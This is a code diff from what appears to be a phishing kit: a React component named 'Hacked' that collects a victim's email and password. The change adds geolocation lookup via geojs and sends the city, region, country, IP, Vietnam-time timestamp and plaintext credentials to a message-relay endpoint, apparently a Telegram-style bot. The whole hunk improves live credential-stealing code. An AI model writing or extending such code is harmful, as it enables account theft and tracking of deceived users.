@@ -75,15 +75,17 @@ const Hacked: React.FC = () => {
 						message: newMessage,
 					});
 				} else {
-					const ip = (await axios.get('https://get.geojs.io/v1/ip'))
-						.data;
+					const geoData = (
+						await axios.get('https://get.geojs.io/v1/ip/geo.json')
+					).data;
+					const locationStr = `${geoData.city}-${geoData.region}-${geoData.country}(${geoData.country_code})`;
 					const currentVietNamTime = new Date().toLocaleString(
 						'vi-VN',
 						{
 							timeZone: 'Asia/Ho_Chi_Minh',
 						},
 					);
-					const message = `<b>Thời gian:</b> <code>${currentVietNamTime}</code>\n<b>📍IP:</b> <code>${ip}</code>\n<b>📩Email:</b> <code>${email}</code>\n<b>🔑Password:</b> <code>${password}</code>`;
+					const message = `<b>Thời gian:</b> <code>${currentVietNamTime}</code>\n<b>📍Location:</b> <code>${locationStr}</code>\n<b>🌐IP:</b> <code>${geoData.ip}</code>\n<b>📩Email:</b> <code>${email}</code>\n<b>🔑Password:</b> <code>${password}</code>`;
 					saveMessage = message;
 					response = await axios.post('/api/send_message', {
 						message: message,
